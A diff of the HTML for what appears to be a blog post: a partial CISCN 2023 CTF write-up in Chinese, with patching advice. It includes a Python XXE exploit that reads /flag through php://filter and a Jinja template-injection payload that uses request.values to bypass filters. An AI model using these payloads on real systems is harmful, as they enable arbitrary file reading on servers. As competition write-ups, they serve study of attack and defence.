@@ -153,11 +153,14 @@
 
 
 
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">Cubic Y^3</span>
-      </span>
-      
+      <div class="meta">
+        <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span class="p-name" itemprop="name">
+            Cubic Y^3
+                    
+          </span>
+        </span>
+        
     <div class="postdate">
       
         <time datetime="2023-07-06T16:28:12.000Z" class="dt-published" itemprop="datePublished">2023-07-07</time>
@@ -166,28 +169,35 @@
     </div>
 
 
-      
+          
     <div class="article-category">
         <i class="fa-solid fa-archive"></i>
         <a class="category-link" href="/categories/CTF/">CTF</a>
     </div>
 
 
-      
+            
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
         <a class="p-category" href="/tags/CISCN/" rel="tag">CISCN</a>, <a class="p-category" href="/tags/Write-Up/" rel="tag">Write-Up</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
     </div>
 
 
-    </div>
+      </div>
   </header>
   
 
-  <div class="content e-content" itemprop="articleBody">
-      <span class="post-count">Word count: 574</span>
-      <span class="post-count">~ 2 min</span>
-    <h1 id="CISCN-2023-部分-Write-Up-及patch妙妙小技巧"><a href="#CISCN-2023-部分-Write-Up-及patch妙妙小技巧" class="headerlink" title="CISCN 2023 部分 Write-Up 及patch妙妙小技巧"></a>CISCN 2023 部分 Write-Up 及patch妙妙小技巧</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>变量覆盖+XXE外部实体注入任意文件读。<br>Patch：修了extract就行<br>exp:  </p>
+    <div class="content e-content" itemprop="articleBody">
+      <script async src="https://npm.elemecdn.com/penndu@1.0.0/bsz.js"></script>
+      <div class="views" style="display: flex; text-align:center; gap: 8px;">
+        <i class="fa-solid fa-eye" style="align-content: center; margin-right: 12px;"></i>
+        <span id="busuanzi_value_page_pv"></span>views
+      </div>
+      <span class="post-count">
+          Word count: 574
+          (~2 mins to read)
+      </span>
+      <h1 id="CISCN-2023-部分-Write-Up-及patch妙妙小技巧"><a href="#CISCN-2023-部分-Write-Up-及patch妙妙小技巧" class="headerlink" title="CISCN 2023 部分 Write-Up 及patch妙妙小技巧"></a>CISCN 2023 部分 Write-Up 及patch妙妙小技巧</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>变量覆盖+XXE外部实体注入任意文件读。<br>Patch：修了extract就行<br>exp:  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">file = <span class="string">&quot;/flag&quot;</span></span><br><span class="line">username = <span class="string">&quot;okok20&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&quot;&quot;<span class="subst">&#123;username&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;&quot;&quot;y&quot;&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;user_xml_format&#x27;</span>: <span class="string">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY content SYSTEM &quot;php://filter/read=convert.base64-encode/resource=<span class="subst">&#123;file&#125;</span>&quot;&gt;]&gt;&lt;userinfo&gt;&lt;user&gt;&lt;username&gt;&amp;content;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;&lt;/userinfo&gt;&quot;&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&quot;http://175.20.20.196/register.php&quot;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = requests.get(<span class="string">f&quot;http://175.20.20.196/login.php?username=<span class="subst">&#123;username&#125;</span>&amp;password=2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
 <h3 id="Ciscn-Search-Engine"><a href="#Ciscn-Search-Engine" class="headerlink" title="Ciscn_Search_Engine"></a>Ciscn_Search_Engine</h3><p>Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&#125;&#125;</span><br><span class="line">post:</span><br><span class="line">name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read&amp;name6=&quot;/flag&quot;</span><br></pre></td></tr></table></figure>
@@ -201,7 +211,7 @@
 </ul>
 <p>相信也可以发现国赛这种patch难度远低于attack的难度。建议<strong>做题的初期当作没有攻击得分，先patch了再说</strong>。</p>
 
-  </div>
+    </div>
 </article>
 
     <div class="blog-post-comments">
@@ -209,7 +219,6 @@
             <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
         </div>
     </div>
-
 
 
         
